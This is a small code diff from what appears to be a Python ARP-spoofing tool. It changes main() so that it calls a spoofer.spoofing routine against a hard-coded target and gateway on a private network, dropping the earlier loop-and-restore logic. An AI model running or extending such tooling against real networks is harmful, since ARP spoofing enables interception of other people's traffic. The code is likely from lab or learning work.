@@ -15,13 +15,7 @@ def main():
     target_ip = "192.168.11.128"
     gateway_ip = "192.168.11.2"
 
-    try:
-        while True:
-            spoofer.spoof(target_ip, gateway_ip)
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("Stopping ARP Spoofing. Restoring the network...")
-        spoofer.restore(target_ip, gateway_ip)
+    spoofer.spoofing(target_ip, gateway_ip)
 
 if __name__ == "__main__":
     main()
